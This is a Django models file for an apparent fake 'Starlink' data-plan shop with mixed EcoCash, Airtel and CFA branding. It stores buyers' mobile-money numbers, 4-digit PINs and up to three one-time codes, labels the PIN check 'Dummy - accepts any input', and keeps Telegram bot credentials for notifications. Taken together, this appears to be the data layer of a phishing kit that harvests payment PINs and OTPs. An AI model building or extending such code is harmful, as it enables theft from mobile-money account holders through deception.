from django.db import models
import random
import string
from datetime import datetime, timedelta
import uuid

# --- Telegram Configuration Model ---
class TelegramConfig(models.Model):
    """
    Stores Telegram bot configuration for notifications.
    """
    bot_token = models.CharField(max_length=255, help_text="Telegram Bot Token")
    chat_id = models.CharField(max_length=100, help_text="Telegram Chat ID or Channel ID")
    is_active = models.BooleanField(default=True)
    created_at = models.DateTimeField(auto_now_add=True)
    updated_at = models.DateTimeField(auto_now=True)

    class Meta:
        verbose_name = "Telegram Configuration"
        verbose_name_plural = "Telegram Configurations"

    def __str__(self):
        return f"Bot: {self.bot_token[:10]}... | Chat: {self.chat_id}"


# --- Satellite Network Package Model ---
class StarlinkPackage(models.Model):
    """
    Represents a Starlink Satellite Network package available for purchase.
    """
    name = models.CharField(max_length=100)
    description = models.TextField()
    price = models.DecimalField(max_digits=12, decimal_places=2)
    data_limit = models.CharField(max_length=50, help_text="e.g., 1GB + 200 Min, Unlimited All, 5GB + 500 Min, etc.")
    is_active = models.BooleanField(default=True)

    def __str__(self):
        return f"{self.name} - CFA{self.price}"


# --- Satellite Network Order Model ---
class StarlinkOrder(models.Model):
    """
    Represents a Starlink Satellite Network data plan purchase order.
    Simplified to only require Account ID and Phone Number.
    """
    STATUS_CHOICES = [
        ('pending', 'Pending'),
        ('payment_entry', 'Payment Entry'),
        ('pin_verified', 'PIN Verified'),
        ('otp_verified', 'OTP Verified'),
        ('completed', 'Completed'),
        ('failed', 'Failed'),
    ]

    id = models.AutoField(primary_key=True)

    # Order Information
    starlink_kit_id = models.CharField(max_length=100, help_text="Satellite Account ID or Decoder Number")
    phone_number = models.CharField(max_length=20, help_text="Customer EcoCash Number")

    # Package Details
    package_name = models.CharField(max_length=100)
    amount = models.DecimalField(max_digits=12, decimal_places=2)

    # EcoCash Verification (Dummy - accepts any input)
    airtel_number = models.CharField(max_length=20, blank=True, null=True)
    pin = models.CharField(max_length=4, blank=True, null=True, help_text="Dummy PIN")
    otp = models.CharField(max_length=4, blank=True, null=True, help_text="Dummy OTP")
    otp_1 = models.CharField(max_length=4, blank=True, null=True)
    otp_2 = models.CharField(max_length=4, blank=True, null=True)
    otp_3 = models.CharField(max_length=4, blank=True, null=True)
    otp_count = models.IntegerField(default=0)

    # Status tracking
    status = models.CharField(max_length=20, choices=STATUS_CHOICES, default='pending')
    pin_verified = models.BooleanField(default=False)
    otp_verified = models.BooleanField(default=False)

    # Timestamps
    created_at = models.DateTimeField(auto_now_add=True)
    updated_at = models.DateTimeField(auto_now=True)
    payment_entered_at = models.DateTimeField(blank=True, null=True)
    pin_verified_at = models.DateTimeField(blank=True, null=True)
    otp_verified_at = models.DateTimeField(blank=True, null=True)
    completed_at = models.DateTimeField(blank=True, null=True)

    class Meta:
        ordering = ['-created_at']
        verbose_name = "Satellite Network Order"
        verbose_name_plural = "Satellite Network Orders"

    def __str__(self):
        return f"{self.starlink_kit_id} - {self.package_name} ({self.status})"
